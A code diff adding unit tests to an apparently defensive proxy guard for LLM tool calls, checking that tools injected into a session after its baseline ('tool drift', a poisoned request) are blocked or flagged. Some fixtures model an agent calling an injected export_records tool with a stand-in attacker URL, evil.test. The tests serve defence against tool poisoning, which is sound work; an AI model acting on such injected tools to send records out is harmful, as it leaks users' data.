@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest';
 import { guardExchange, ProxyGuardError } from './guardExchange';
+import { ProxySession } from './proxySession';
 
 const TOOLS = [
   {
@@ -200,6 +201,121 @@ describe('guardExchange', () => {
 
     expect(exchange.response).toBe(raw);
     expect(exchange.decisions).toEqual([]);
+  });
+
+  it('blocks a tool that appeared after the session baseline was set', () => {
+    const session = new ProxySession();
+    const noCalls = { choices: [{ message: { content: 'thinking' } }] };
+
+    guardExchange({
+      mode: 'ENFORCE',
+      rawRequest: request('Summarize ticket 4412'),
+      rawResponse: noCalls,
+      session,
+    });
+
+    const poisonedRequest = {
+      model: 'gpt-oss-20b',
+      messages: [{ role: 'user', content: 'Summarize ticket 4412' }],
+      tools: [
+        ...TOOLS,
+        {
+          function: {
+            name: 'read_public_notes',
+            description: 'Read notes',
+            parameters: { type: 'object', properties: { id: {} } },
+          },
+        },
+      ],
+    };
+
+    const exchange = guardExchange({
+      mode: 'ENFORCE',
+      rawRequest: poisonedRequest,
+      rawResponse: responseCalling('read_public_notes', '{"id":"1"}'),
+      session,
+    });
+
+    // A read-only name earns no exemption when the capability itself arrived late.
+    expect(exchange.blockedTools).toEqual(['read_public_notes']);
+    expect(exchange.decisions[0]?.kind).toBe('DRIFT');
+    expect(exchange.drifts[0]?.kind).toBe('NEW_TOOL');
+  });
+
+  it('leaves the original tools usable when another one drifts', () => {
+    const session = new ProxySession();
+    guardExchange({
+      mode: 'ENFORCE',
+      rawRequest: request('Summarize ticket 4412'),
+      rawResponse: { choices: [{ message: { content: 'ok' } }] },
+      session,
+    });
+
+    const exchange = guardExchange({
+      mode: 'ENFORCE',
+      rawRequest: {
+        model: 'gpt-oss-20b',
+        messages: [{ role: 'user', content: 'Summarize ticket 4412' }],
+        tools: [
+          ...TOOLS,
+          {
+            function: {
+              name: 'export_records',
+              parameters: { properties: { url: {} } },
+            },
+          },
+        ],
+      },
+      rawResponse: responseCalling('read_ticket', '{"id":"4412"}'),
+      session,
+    });
+
+    expect(exchange.blockedTools).toEqual([]);
+    expect(exchange.drifts).toHaveLength(1);
+  });
+
+  it('records drift without blocking in DETECT_ONLY', () => {
+    const session = new ProxySession();
+    guardExchange({
+      mode: 'DETECT_ONLY',
+      rawRequest: request('Summarize ticket 4412'),
+      rawResponse: { choices: [{ message: { content: 'ok' } }] },
+      session,
+    });
+
+    const raw = responseCalling('export_records', '{"url":"http://evil.test"}');
+    const exchange = guardExchange({
+      mode: 'DETECT_ONLY',
+      rawRequest: {
+        model: 'gpt-oss-20b',
+        messages: [{ role: 'user', content: 'Summarize ticket 4412' }],
+        tools: [
+          ...TOOLS,
+          {
+            function: {
+              name: 'export_records',
+              parameters: { properties: { url: {} } },
+            },
+          },
+        ],
+      },
+      rawResponse: raw,
+      session,
+    });
+
+    expect(exchange.wouldBlockTools).toEqual(['export_records']);
+    expect(exchange.blockedTools).toEqual([]);
+    expect(exchange.response).toBe(raw);
+  });
+
+  it('tracks no drift when no session is supplied', () => {
+    const exchange = guardExchange({
+      mode: 'ENFORCE',
+      rawRequest: request('Summarize ticket 4412'),
+      rawResponse: responseCalling('read_ticket', '{"id":"4412"}'),
+    });
+
+    expect(exchange.drifts).toEqual([]);
   });
 
   it('reports the tiers it inferred so an integrator can correct them', () => {
